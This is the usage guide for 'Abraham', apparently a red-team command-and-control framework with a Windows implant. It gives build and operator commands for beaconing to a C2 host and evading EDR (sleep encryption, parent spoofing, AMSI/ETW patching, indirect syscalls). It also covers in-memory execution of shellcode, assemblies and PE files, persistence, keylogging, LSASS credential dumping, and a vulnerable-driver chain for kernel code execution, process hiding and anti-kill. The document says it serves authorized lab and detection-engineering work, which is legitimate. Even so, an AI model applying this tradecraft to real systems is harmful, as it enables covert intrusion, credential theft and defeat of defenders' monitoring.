# Abraham — Usage

Binaries are built from the workspace root:

```
cargo build --release
```

## 1. Start the teamserver

```
target\release\abraham-server.exe [--listen 0.0.0.0:8443] [--mgmt 127.0.0.1:9000] [--key server.key] [--profile profiles\default.yaml] [--tls-cert server-cert.pem] [--tls-key server-tls-key.pem]
```

On first run the server generates its Ed25519 identity, persists the seed in
`server.key` and writes the public key (hex) to `server.pub`, and generates a
self-signed TLS certificate (PEM pair). Startup output prints both the pinned
identity (hex) and the TLS certificate sha256 pin.

The c2 listener speaks HTTPS: tasking rides inside HTTP/1.1 keep-alive POSTs
within TLS, shaped by the malleable profile (`docs/protocol.md` §8).
`--stage-file <path>` makes every GET on the profile URIs serve
that file's bytes (staged payload download over the same malleable
front — see `deploy/avln/README.md` for the live host). `--plain-c2`
disables the TLS front for use behind a redirector that
terminates real TLS (see `deploy/redirector/`). The implant's outer
TLS is the OS stack (Schannel on Windows): the ClientHello fingerprint
matches native Windows traffic — middleboxes that hold non-browser
handshakes (measured: Fortinet DPI vs rustls) see an ordinary flow.
The inner Ed25519 session is the security boundary either way.

## 2. Start the implant (authorized lab machines only)

Two artifact flavors (ABR-T023):

**Lab build** — CLI flags, stderr diagnostics, everything observable:

```
cargo build --release -p abraham-implant --features lab-log
target\release\abraham-implant.exe --server <host:port> --key <contents of server.pub> [--sleep 5] [--jitter 0.25] [--profile <yaml>] [--ua <user-agent>] [--uri <uri>] [--tls-pin <sha256-hex>] [--evasion ekko,ppid]
```

**Operational build** — no command line at all. The deployment
configuration is compiled in (one encrypted JSON blob, schema in
`docs/protocol.md` §8.1) and the CLI parser/log strings do not exist in
the artifact (Sysmon EID 1 sees a bare image path):

```
{"servers": ["c2.example.com:443", "backup.example.com:443"],
 "key": "<server.pub hex>", "tls_pin": "<sha256-hex or empty>",
 "evasion": "ekko,ppid", "profile": "sleep_secs: 30\njitter: 0.4\n",
 "kill_date": 1797036250,
 "gates": {"initial_delay_max_secs": 0, "blocked_processes": []}}  > embed.json
set ABRAHAM_EMBED=C:\path\embed.json
cargo build --release -p abraham-implant
```

`kill_date` (unix seconds, 0 = never) makes the implant exit silently
once past it; `gates` hold the random pre-contact activation delay and
the blocked-process dormancy list; `servers` is the failover order
(rotate after 3 consecutive failures, same session resumed).

A build with neither embedded configuration nor flags exits (fail
closed — there is no localhost default). CI gates the artifact with a
static OPSEC audit (no project/flag/PDB/builder strings).

The implant connects over TLS, performs the E2E handshake, sends `REGISTER`,
then polls for tasks every `sleep` seconds with `jitter` randomization,
reconnecting on failure. `--tls-pin` (sha256 of the server certificate DER,
printed by the teamserver at startup) pins the outer TLS layer; without it
any certificate is accepted and authenticity relies on the inner Ed25519
handshake.

`--evasion` (lab flag, or the embedded `evasion` field) enables Phase 2
capabilities (comma-separated): `ekko` encrypts the executable section
during each sleep (waitable-timer APC + RC4), `ppid` spawns shell tasks
under a spoofed parent with a fallback to plain spawning where the OS
rejects the attribute (see `docs/detections/abr-t007.md` for the
Windows 11 25H2 findings). Default: all off. Reconnection backs off
exponentially (5 s doubling to 300 s, jittered) after consecutive
failures and resets once a session reaches the beacon loop.

## Module tasks (preferred over shell)

Routine collection runs IN-PROCESS through built-in modules — no
`cmd.exe` child, no process-creation telemetry (ABR-T011; see
`docs/detections/abr-t011.md`). Available: `ps` (pid, ppid, threads,
handles, name, IMAGE PATH, COMMAND LINE and best-effort OWNER — the
detail pass runs a per-pid `NtQueryInformationProcess` + token query
through the spoofed dispatcher; protected processes degrade to `-`),
`ls <path>`, `cat <path>` (capped at 512 KiB; use download for bigger
files), `mkdir <path>`, `rm <path>`, `mv <src> <dst>`, `cp <src>
<dst>` (ABR-T028), `whoami` (REAL ppid, token integrity and
`RtlGetVersion` build — the same values REGISTER reports), `netstat`
(TCP/UDP owner-pid tables via iphlpapi, IPv4+IPv6), `arp`, `route`,
`domain` (join state, DC/forest/site, DNS identity), `disks`,
`services` (ABR-T029) and `env`. Submit with `module <id> <name>
[args...]` in the TUI or `{"cmd":"module","session":N,"name":"ps"}`
on the mgmt port.
Shell tasks remain available but are the noisy option — prefer modules
whenever one fits.

## Execute-assembly tasks (ABR-T024/T025)

`execasm <id> <local-file> [typeName methodName arg]` queues a .NET
Framework assembly (a DLL/EXE on the teamserver host, <= 48 KB) to run
INSIDE the implant through bare CLR hosting — no powershell.exe, no
child process. AMSI and ETW are patched for the process first
(disable with `"patch": false` on the mgmt port). The assembly must
expose `public static int <MethodName>(string)`; defaults are
`Prog.Go`. The CLR keeps the temp copy mapped, so the result reports
delete / delete-on-close / the residue path honestly — the disk flash
(EID 11) is this technique's detection anchor and the persisted file
is the operator's own assembly, recoverable by the blue team.

## PowerShell tasks (ABR-T024/T026)

`psrun <id> <script or local .ps1>` runs PowerShell IN-PROCESS: the
teamserver compiles the bootstrap (`tools/psboot.cs`, in-box csc,
cached under `cache/`), the implant patches AMSI/ETW for its process
and executes the script inside its own CLR instance. No
`powershell.exe`, no child process, script-block logging silenced by
the ETW patch — this is the AMSI bypass that matters operationally.
The result carries the captured script output. Second and later
scripts reuse the running CLR. Constrained Language Mode applies as
usual.

## Native PE tasks (ABR-T027)

`runpe <id> <local .exe/.dll or staged target path>` maps a native x64
PE in-memory and runs it on a dedicated thread: sections, DIR64
relocations, imports against live modules, whole image RX. The
resolver redirects ExitProcess-family imports to an ExitThread stub so
the payload cannot kill the implant. <= 48 KB goes inline; bigger PEs
travel via `upload` and the stage is deleted the moment it is mapped.
Supported shape: `no_std`/loader-light payloads — CRT/TLS-heavy exes
(rust `std`, full MSVC CRT) fault without the loader (documented);
use `exec`/`execasm`/`psrun` for those.

## Host persistence tasks (ABR-T030)

`persist <id> <install|remove|list> [mechanism] [name] [args...]`
installs, removes and reports boot/logon survival in-process
(default mechanism `run-key`, default name `abraham`):

- `run-key` / `run-key-hklm` — `...\CurrentVersion\Run` value (HKLM
  needs elevation)
- `startup` — copy of the implant in the per-user Startup folder
- `service` — auto-start SCM service (elevation; NOT started at
  install — it survives reboots, a running copy would be a second
  beacon)

The persisted binary defaults to a copy of the implant dropped as
`%APPDATA%\<name>.exe` (override with an uploaded path via the mgmt
`exe` field). `persist <id> list <mechanism> <name>` reports the live
state of every mechanism; `remove` uninstalls by name. Detection
coverage here is mature by design (Sysmon 12/13, 11, 7045/4697) — see
`docs/detections/abr-t030.md`. The schtasks/WMI-subscription COM
vectors are documented follow-ups.

## Collection tasks (ABR-T031)

`collect <id> <screenshot|clipboard|keylog>`:

- `screenshot` — virtual-screen capture as PNG (WIC; BMP fallback),
  lands in `loot/session-N/task-M.bin` via the chunked path
- `clipboard` — point-in-time CF_UNICODETEXT read
- `keylog` — dumps and clears the keystroke buffer. Keystrokes are
  sampled with `GetAsyncKeyState` at every beacon wake-up (no hook, no
  thread — the ekko sleep window forbids a second thread executing
  implant code), so coverage equals the beacon cadence: lower the
  sleep before a keylogging window, raise it after.

## Credential access tasks (ABR-T032/T033)

`cred <id> <user|kernel>` dumps LSASS through the custom minidump
writer (no dbghelp/comsvcs chain) into `%TEMP%\<random>.tmp` — the
result is the path; fetch it with `download <id> <path>` and parse
offline:

- `user` (T032) — NtOpenProcess(VM_READ) + NtReadVirtualMemory through
  the indirect-syscall layer. Sysmon EID 10 fires by design: this
  variant validates your lsass-access coverage.
- `kernel` (T033) — requires the staged iqvw64e driver
  (`driver <id> load ...` first). KeStackAttachProcess via the call
  trampoline; no lsass handle is ever opened, so EID 10 stays silent —
  the documented coverage-gap exhibit. The WinIo physical path is
  blacklisted (0x1A bugchecks) and stays unused.

## Shellcode tasks (ABR-T022)

`exec <id> <local-file>` queues an in-process shellcode stage: the blob
(a raw binary file on the teamserver host, <= 48 KB) is copied to a
private RW region via indirect syscalls, flipped RX, called as
`fn(usize) -> usize` ON the session thread and freed. No child process,
no new thread, no cross-process handle — Sysmon EID 8/10 stay dark.
Stages that never return park the beacon; stagers that return are the
intended shape. Sensitive buffers (commands, module args, payloads,
downloads) are zeroed (`secure_clear`) as soon as the session thread is
done with them.

## Driver staging tasks (ABR-T013, lab only)

The DRIVER task drives the kernel-driver staging lifecycle through the
SCM — stage 3.1 of the BYOVD chain, exercised against benign signed
drivers (a copy of `null.sys`) before any vulnerable driver is involved.
`driver <id> load <service> <source> <drop_path>` copies the driver
file, registers a demand-start kernel service on it and starts it;
`driver <id> unload <service> [drop_path]` stops/deregisters the service
and removes the staged file. After a vulnerable driver is loaded,
`driver <id> probe` (ABR-T014) opens the driver's device and proves
arbitrary kernel read (leaks the ntoskrnl base and verifies its MZ
header through the driver; `probe <depth>` runs staged read-only
dry-runs, depths 1-7). `driver <id> elevate` (ABR-T015) proves the
write primitive: SYSTEM token swap, in-process proof and restore.
`driver <id> gate` returns the capability tier verdict;
`driver <id> hide`/`unhide` (ABR-T016) DKOM-unlink the implant from
the global process lists and relink it again with a guarded restore.
`driver <id> call` (ABR-T017) drives the call-capable iqvw64e client
(kernel function calls via the NtAddAtom trampoline) — on current
builds the revoked driver fails to load with a clean error and rich
`driver <id> map [payload.sys]` (ABR-T018) maps an unsigned driver
through the loaded iqvw64e (Nal) client KDMapper-style: pool
allocation, sections, relocations, imports against the live kernel
export tables, then a real `DriverEntry` call. Without a payload path
it maps the builtin in-memory proof driver (magic stamp + import call
+ relocated reference; image freed after entry) and reports
`KERNEL CODE EXECUTION PROVEN`; with a path it maps that `.sys` and
leaves it resident. Requires `driver <id> load iqvw64e <src> <dst>`
first (the loader install is the EID 7045/6 detection anchor — see
`docs/detections/abr-t018.md`). `driver <id> modhide <name.sys>` (ABR-T019) unlinks the loader
module's entry from `nt!PsLoadedModuleList`: driver enumeration
(`NtQuerySystemInformation(SystemModuleInformation)`-based tooling) goes
blind while the image stays mapped and the device keeps answering;
`driver <id> modshow <name.sys>` relinks it (guarded). `driver <id>
protect on` (ABR-T020) copies the SYSTEM process's EPROCESS.Protection
byte onto the implant — termination from every unprotected context
(admin taskkill, Stop-Process) is denied while the session keeps
beaconing; `protect off` restores. Driver `load` is serviceless since
ABR-T019: the service registration and staged file are removed right
after the start (the image and device live on until reboot; the EID
7045 install event remains the irreducible telemetry). CodeIntegrity
telemetry. `driver <id> map <payload.sys>` with OUR payload
(`payloads/abraham-km`, built by `tools/build_payload.sh`) provisions
the ABR-T021 covert channel: a shared NonPagedPool block plus an
injected kernel function table (the payload is freestanding Rust with
zero imports). `driver <id> chan hb` polls the kernel heartbeat,
`chan ping` round-trips a command, `chan protect` arms kernel-side
self-healing anti-kill (re-applied every 2s tick, survives usermode
resets), `chan unprotect` clears it, `chan stop` cancels the payload
timer. `driver <id> elevate` (ABR-T015,
experimental) proves the write primitive: SYSTEM token swap,
in-process proof and restore. Vulnerable-driver binaries are
operator-staged over `upload` -- they never live in this repository.
Requires an elevated session. Every step is
loud by design — see `docs/detections/abr-t013.md` for the EID 7045/6
footprint it cannot avoid.

Four Phase 2 hardenings are always-on, no flag needed: hand-assembled Ekko
routines register unwind metadata (`RtlAddFunctionTable`, ABR-T008) so
stack walks restore their real contexts, SSN resolution falls back to
untouched stubs from a `\KnownDlls\ntdll.dll` view (ABR-T009) when every
local stub and neighbour is hooked, indirect syscalls dispatched by
the implant pivot to a synthetic call stack attributed to system modules
(ABR-T010) unless a user-mode shadow stack is enforced, and the ekko code
home is carved out of a phantom-mapped signed DLL's `.text` (ABR-T012)
instead of `MEM_PRIVATE` memory, with a private-allocation fallback. All
ship with detection guidance in `docs/detections/`.

## 3. Operate

### TUI

```
target\release\abraham-tui.exe [mgmt addr] [mgmt token]
```

The token may also come from `ABRAHAM_MGMT_TOKEN`; it is only needed
when the teamserver runs with `--mgmt-token`. Commands: `sessions`,
`shell <id> <command...>`, `module <id> <name> [args...]` (in-process:
ps/ls/cat/whoami/netstat/env), `exec <id> <shellcode file>`, `execasm`,
`psrun`, `runpe`, `driver <id> <action>`, `upload <id> <local>
<remote>`, `download <id> <path>`, `sleep <id> <secs> <jitter>`,
`results <id> [limit]`, `exit <id>`. `Esc` quits. Sessions the
teamserver considers stale (last seen > 10x profile sleep) render with
a `[stale]` marker.

### Scripting (JSON lines on the mgmt port)

```
python tools\mgmt_client.py '{\"cmd\":\"sessions\"}' 9000
python tools\mgmt_client.py '{\"cmd\":\"shell\",\"session\":1,\"command\":\"whoami\"}' 9000
```

With `--mgmt-token <secret>` the first line of every mgmt connection
must be `{"auth":"<secret>"}`; the server acks `{"ok":true}` before
accepting commands and audits refusals.

Downloads land in `loot/session-<id>/task-<n>.bin`.

### Server-side operational record

- `state/sessions.json` — session registry AND undelivered task queue;
  a restart re-enqueues tasks that had not been polled yet
  (`--state ""` disables persistence).
- `state/audit.jsonl` (`--audit`, empty value disables) — JSON lines of
  `session_new`, `session_resume`, `task_queued`, `task_delivered`,
  `task_result`, `download_loot`, `mgmt_denied`. This is the
  after-action source: map task delivery timestamps against detection
  telemetry when writing validation reports.

## 4. Run the test suite

```
cargo test --workspace
python tools\validate_registry.py
```

## Lab validation (detection engineering)

Before flipping a technique to `experimental` in
`registry/techniques.yaml`, run it against the instrumented lab VM (Sysmon +
ETW), capture the telemetry, and verify the mapped detection fires. Store
evidence under `lab/captures/` (gitignored).
